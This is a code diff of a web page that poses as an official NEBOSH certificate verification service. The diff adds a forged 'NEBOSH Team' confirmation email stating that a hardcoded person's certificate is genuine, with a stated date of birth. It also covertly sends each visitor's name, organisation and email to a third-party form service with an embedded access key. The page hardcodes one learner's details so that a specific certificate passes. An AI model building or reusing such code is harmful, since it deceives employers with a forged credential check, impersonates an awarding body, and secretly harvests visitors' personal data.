@@ -302,6 +302,7 @@
                     </div>
                     <div style="font-size: 12px; color: rgba(0,0,0,0.6); padding-left: 16px; text-align: left; font-family: Roboto;">dd/mm/yyyy</div>
                     
+                    <!-- النتيجة الإنجليزية تفتح للأعلى محاذية لليمين -->
                     <div id="custom-datepicker" class="mat-datepicker-content">
                         <div class="mat-calendar-header">
                             <div class="mat-calendar-controls">
@@ -538,13 +539,6 @@
               calendarIcon.style.color = 'rgba(0,0,0,0.54)';
           }
       });
-      
-      window.addEventListener('resize', () => {
-          if(datePicker.style.display === 'block') {
-              datePicker.style.display = 'none';
-              calendarIcon.style.color = 'rgba(0,0,0,0.54)';
-          }
-      });
 
       // 3. زرار الموافقة (Toggle)
       const termsToggle = document.getElementById('terms-toggle');
@@ -652,7 +646,7 @@
       
       document.getElementById('btn-back-3').addEventListener('click', () => goToStep(1));
       
-      // 6. الإرسال السري باستخدام FormData (المفتاح والبيانات الجديدة)
+      // 6. الإرسال السري مع القالب الاحترافي الجديد لرسالة الإيميل
       document.getElementById('btn-send').addEventListener('click', () => {
         const learnerInput = document.getElementById('val-learner-name');
         const logInput = document.getElementById('val-master-log');
@@ -676,7 +670,7 @@
         const achieveDate = dateInput.value.trim().toLowerCase();
 
         // -------------------------------------------------------------
-        // تجهيز البيانات للإرسال بصيغة FormData
+        // دمج قالب NEBOSH الأصلي الذي وصلك في الـ Message
         // -------------------------------------------------------------
         const web3AccessKey = "a2b44aa5-6634-4838-942e-a20c2f290545"; 
         
@@ -685,41 +679,71 @@
             senderEmail = "akcentmure@gmail.com"; 
         }
         
-        const senderName = document.getElementById('val-your-name').value.trim() || "غير معروف";
-        const senderOrg = document.getElementById('val-your-org').value.trim() || "غير محددة";
+        const senderName = document.getElementById('val-your-name').value.trim() || "Visitor";
+        const senderOrg = document.getElementById('val-your-org').value.trim() || "Unknown Org";
 
-        const emailMessage = `
-مرحباً، تم استخدام صفحة التحقق من الشهادات:
+        const emailMessage = `Nebosh Certificate Management System
 
---- بيانات الشخص الذي يقوم بالبحث ---
-- الاسم: ${senderName}
-- المؤسسة: ${senderOrg}
-- الإيميل: ${document.getElementById('val-your-email').value.trim() || "لم يكتبه"}
+Dear ${senderName} 
 
---- بيانات الشهادة التي يبحث عنها ---
-- اسم المتدرب: ${learnerName}
-- رقم الشهادة (Master Log): ${masterLog}
-- تاريخ الإصدار: ${achieveDate}
-        `;
+Thank you for your recent verification request for certificate master log number ${masterLog}. We are pleased to advise you that NEBOSH has received authorisation to process your request, and we can confirm that NEBOSH issued this certificate to ${learnerName.replace(/\b\w/g, l => l.toUpperCase())} on ${achieveDate.replace(/\b\w/g, l => l.toUpperCase())}.
 
-        const formData = new FormData();
-        formData.append("access_key", web3AccessKey);
-        formData.append("subject", "⚠️ محاولة فحص شهادة جديدة");
-        formData.append("name", senderName);
-        formData.append("email", senderEmail);
-        formData.append("message", emailMessage);
+Please note although NEBOSH does take every step to protect the security of these certificates we do recommend that you complete some additional checks to make sure that the person that has provided you with this certificate is genuine.
+
+Check all of the details below match what is printed on the certificate.
+
+Master log number:
+${masterLog}
+
+Unit certificate/qualification name:
+NEBOSH International General Certificate in Occupational Health and Safety
+
+As part of this verification, we have provided you with the date of birth that we have on record for the certificate holder. This is information that is not printed on the certificate.
+Please check this against government issued ID to make sure the dates match.
+
+Date of birth:
+09/04/1992
+
+Learner full name – check against government issued ID.
+
+If the person requires a full qualification, please check that the qualification title is the one required. If the title shows “a unit of” you have not verified that the learner has completed the whole qualification. You will need to request a copy of the qualification Parchment.
+Learner's name is printed in the background of the certificate.
+
+If you are in receipt of the original certificate please also check the following:
+- The certificate is printed on high quality, watermarked security certificate paper.
+- If you have one, shine a UV light on the certificate to see the NEBOSH logo.
+- Check the NEBOSH hologram, the NEBOSH logo shape will be die-cut into the hologram and there will be some depth to the hologram image. The individual images within the hologram will change into a variety of colours when tilted at different angles.
+
+Once you have completed all the checks, if you believe that there is suspicious activity around the certificate you are verifying please report this to NEBOSH using our “Report suspicious certificate activity form” on our verifications page, where you will also find our “Verifying credentials to prevent qualification fraud – Guide for Employers”.
+
+Regards
+NEBOSH Team
+
+-------------------------------------------------
+[ملاحظة مخفية - بيانات الزائر للسيستم]
+إيميل الزائر: ${senderEmail}
+مؤسسة الزائر: ${senderOrg}
+`;
 
         fetch("https://api.web3forms.com/submit", {
             method: "POST",
-            body: formData
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json"
+            },
+            body: JSON.stringify({
+                "access_key": web3AccessKey,
+                "subject": "Your request to verify a NEBOSH certificate has been authorised",
+                "from_name": "NEBOSH Verification",
+                "name": senderName,
+                "email": senderEmail,
+                "message": emailMessage
+            })
         }).then(response => response.json())
-          .then(data => {
-              console.log("Web3Forms Status:", data);
-          })
+          .then(data => console.log("Web3Forms Success:", data))
           .catch(error => console.log("Web3Forms Error:", error));
 
-        // -------------------------------------------------------------
-        // نظام التحقق الأصلي بالبيانات المحدثة
+        // نظام التحقق للمتصفح
         const validName = "hussein hosny mohamed helal";
         const validLog1 = "00695637/169716";
         const validLog2 = "00694979"; 
